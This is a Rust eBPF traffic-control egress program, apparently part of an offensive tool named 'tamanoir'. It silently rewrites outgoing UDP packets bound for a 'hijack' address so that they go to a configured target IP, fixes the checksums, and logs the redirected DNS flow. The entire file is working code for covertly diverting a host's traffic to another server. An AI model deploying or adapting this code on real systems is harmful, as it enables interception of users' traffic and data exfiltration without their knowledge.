use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::TC_ACT_PIPE, cty::c_void, helpers::bpf_skb_store_bytes, macros::classifier,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
};

use crate::common::{
    HIJACK_IP, IP_CSUM_OFFSET, IP_DEST_ADDR_OFFSET, TARGET_IP, UDP_CSUM_OFFSET,
    UDP_DEST_PORT_OFFSET,
};

// Maps

#[classifier]
pub fn tamanoir_egress(ctx: TcContext) -> i32 {
    match tc_process_egress(ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let addr = header.dst_addr;
        if let IpProto::Udp = header.proto {
            if addr == hijack_ip {
                let target_dns_mut = &mut target_ip.to_be() as *mut u32;

                let skb = &ctx.skb;

                info!(
                    &ctx,
                    "ipcsum: {}  udpcsum: {}",
                    u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
                    u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
                );

                // recompute l3 and l4 checksums
                if let Err(err) = (*skb).l3_csum_replace(
                    IP_CSUM_OFFSET,
                    header.dst_addr as u64,
                    target_ip.to_be() as u64,
                    4,
                ) {
                    error!(&ctx, "error: {}", err);
                }

                // dst addr part for udphdr
                if let Err(err) = (*skb).l4_csum_replace(
                    UDP_CSUM_OFFSET,
                    header.dst_addr as u64,
                    target_ip.to_be() as u64,
                    20,
                ) {
                    error!(&ctx, "error: {}", err);
                }

                // update dst addr
                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        IP_DEST_ADDR_OFFSET as u32,
                        target_dns_mut as *const c_void,
                        4,
                        2,
                    )
                } < 0
                {
                    error!(&ctx, "error writing new address ");
                }

                info!(
                    &ctx,
                    "=> ipcsum: {}  udpcsum: {}",
                    u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
                    u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
                );

                info!(
                    &ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(addr),
                    53,
                    Ipv4Addr::from_bits(u32::from_be(
                        (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr,
                    )),
                    u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                );
            };
        }
    };

    Ok(TC_ACT_PIPE)
}
